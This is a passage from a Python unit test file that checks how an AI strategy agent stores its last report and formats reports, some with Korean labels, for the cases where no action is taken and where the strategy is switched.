                            lambda name: good_perf)

        assert agent.get_last_report() is None
        report = await agent.run()
        assert agent.get_last_report() is report


class TestFormatReport:
    def test_format_report_no_action(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        perf = _make_performance()
        report = AgentReport(
            timestamp=datetime(2025, 1, 1, 12, 0, 0),
            current_strategy="tech_strategy",
            performance=perf,
            action_taken="none",
            analysis="All good.",
        )
        formatted = agent.format_report(report)
        assert "tech_strategy" in formatted
        assert "없음" in formatted
        assert "AI Strategy Agent Report" in formatted

    def test_format_report_strategy_switched(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        perf = _make_performance()
        report = AgentReport(
            timestamp=datetime(2025, 1, 1, 12, 0, 0),
            current_strategy="tech_strategy",
            performance=perf,
            action_taken="strategy_switched",
            new_strategy_name="ai_new_v1",
            new_strategy_file="/tmp/ai_new_v1.py",
            attempts=1,
        )
        formatted = agent.format_report(report)
        assert "ai_new_v1" in formatted
        assert "strategy_switched" in formatted or "전략 교체" in formatted
